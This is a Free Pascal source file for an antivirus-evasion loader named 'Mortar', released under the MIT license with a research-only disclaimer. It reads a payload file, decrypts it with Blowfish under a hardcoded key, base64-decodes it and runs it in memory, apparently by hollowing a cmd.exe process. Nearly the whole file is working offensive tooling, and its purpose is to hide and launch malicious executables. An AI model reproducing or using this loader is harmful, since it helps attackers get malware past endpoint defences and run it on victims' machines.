{
 ===========================================
 MIT License

Copyright (c) 2021 0xsp security research and development

   Mortar Evasion Technique - EXE Loader
   Author : 0xsp.com @zux0x3a



  the author of this module is not responsible for any misuse of this code or similair copied code, the source code and compiled binaries
  are published for the security researching only.
  the technique has been presented in online conference before the release and well-detailed paper has been posted online to help open-source community to build
  enhanced security solutions.

 ===============================================================

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

      }

program deliver;

{$mode objfpc}{$H+}


uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Classes, SysUtils, strutils, CustApp, process, base64,
  blowfish,runner;

type

  { deliver }

  deliverm = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
    procedure decodestage;virtual;

  end;

{ deliver }

procedure deliverm.DoRun;
var
  ErrorMsg: String;
begin
  // quick check parameters
  ErrorMsg:=CheckOptions('h e d f c', 'help encode decode file command');
  if ErrorMsg<>'' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('h', 'help') then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  if hasoption('d','decode') then begin
     decodestage;
     end;
  { add your program here }
  // stop program loop

  Terminate;

end;

constructor deliverm.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor deliverm.Destroy;
begin
  inherited Destroy;
end;
function StreamToBase64(AInputStream: TStream): string;
var
  OutputStream: TStringStream;
  Encoder: TBase64EncodingStream;
begin
  Result := '';

  OutputStream := TStringStream.Create('');
  Encoder := TBase64EncodingStream.Create(OutputStream);

  try
    Encoder.CopyFrom(AInputStream, AInputStream.Size);
    Encoder.Flush;

    Result := OutputStream.DataString;
  finally
    Encoder.Free;
    OutputStream.Free;
  end;
end;

function Base64ToStream(const ABase64:string; AOutStream: TMemoryStream; const AStrict: Boolean=false):Boolean;
var
  InStream: TStringStream;
  Decoder: TBase64DecodingStream;
  temp :string;
    BA_IN, BA_OUT: array of Byte;
begin
  setlength(BA_IN,20);
  BA_IN[0]:= $90;
  BA_IN[1]:= $90;
  BA_IN[2]:= $90;
  BA_IN[3]:= $90;
  BA_IN[4]:= $90;
  BA_IN[5]:= $90;
  BA_IN[6]:= $90;
  BA_IN[7]:= $90;
  BA_IN[8]:= $90;
  BA_IN[9]:= $90;
  BA_IN[10]:= $90;
  BA_IN[11]:= $90;
  BA_IN[12]:= $90;
  BA_IN[13]:= $90;
  BA_IN[14]:= $90;
  BA_IN[15]:= $90;
  BA_IN[16]:= $90;
  BA_IN[17]:= $90;
  BA_IN[18]:= $90;
  BA_IN[19]:= $90;

  Result := False;
  InStream := TStringStream.Create(ABase64);

  try
    if AStrict then
      Decoder := TBase64DecodingStream.Create(InStream, bdmStrict)
    else
      Decoder := TBase64DecodingStream.Create(InStream, bdmMIME);
    try
      AOutStream.Seek(0,sofrombeginning);
    //   AoutStream.WriteBuffer(BA_IN,20);
     //  AoutStream.Position:=0;
      AOutStream.CopyFrom(decoder,decoder.Size);
       Result := True;
    finally
      Decoder.Free;
    end;
  finally
    InStream.Free;
  end;
end;






function bintostr(const bin: array of byte): string;
const HexSymbols = '0123456789ABCDEF';
var i: integer;
begin
  SetLength(Result, 2*Length(bin));
  for i :=  0 to Length(bin)-1 do begin
    Result[1 + 2*i + 0] := HexSymbols[1 + bin[i] shr 4];
    Result[1 + 2*i + 1] := HexSymbols[1 + bin[i] and $0F];
  end;
end;


function blowfish_decryption:string;
var
  de :TBlowFishDeCryptStream;
  s2: TStringStream;
  temp:string;
  key:rawbytestring;

  i :integer;

  AMemStr, AMemStr2: TMemoryStream;
  AStrStr: TStringStream;

  processhandle:thandle;

  BA_IN: array of Byte;
  outp,f_name,command_line:string;

begin

//7a 75 78 69 61 6d 68 65 72 65
   SetLength(BA_IN, 10);     //key converted into bytes
   BA_IN[0]:= $7a;
   BA_IN[1]:= $75;
   BA_IN[2]:= $78;
   BA_IN[3]:= $69;
   BA_IN[4]:= $61;
   BA_IN[5]:= $6d;
   BA_IN[6]:= $68;
   BA_IN[7]:= $65;
   BA_IN[8]:= $72;
   BA_IN[9]:= $65;

       for i:=1 to paramcount do begin
         if (paramstr(i)='-f') then begin
           f_name := paramstr(i+1);
         end;

         if (paramstr(i)='-c') then begin
           command_line := paramstr(i+1);
         end;


       end;

  //Load some file
  AMemStr := TMemoryStream.Create;
 AMemStr.LoadFromFile(f_name);
  AmemStr.Write(outp[1],length(outp) * sizeof(outp[1]));
 AMemStr.Position := 0;

  //copy MemoryStream to StringStream
  AStrStr := TStringStream.Create('');
  AStrStr.Size := AMemStr.Size;
  AStrStr.CopyFrom(AMemStr, AMemStr.Size);
  AStrStr.Position := 0;


   key := TEncoding.UTF8.GetString(BA_IN);
 //key :='zuxiamhere';


  s2 := TStringStream.Create(AStrStr.DataString);
  de := TBlowFishDeCryptStream.Create(key,s2);
  AStrStr.Free;
  SetLength(temp,s2.Size);
  de.Read(temp[1],s2.Size);

   AMemStr2 := TMemoryStream.Create;

   Base64tostream(temp,Amemstr2,false);

  {$ifdef win64}
  fork_x64('c:\\windows\\system32\\cmd.exe '+ command_line,runner.TByteArray(AMemStr2.memory),processhandle);
  {$ENDIF }

   {$ifdef win32}
  fork_x86('c:\\windows\\system32\\cmd.exe '+ command_line,runner.TByteArray(AMemStr2.memory),processhandle);
  {$ENDIF }

  AMemStr2.Free;
  //  AMemStr3.Free;
  Amemstr.Free;

  end;


procedure deliverm.decodestage;
begin
  blowfish_decryption;
end;



procedure deliverm.WriteHelp;
begin
  { add your help code here }
  writeln('Usage: ', ExeName, ' -h');
end;

var
  Application: deliverm;
begin
  Application:=deliverm.Create(nil);
  Application.Title:='deliver';
  Application.Run;
  Application.Free;
end.

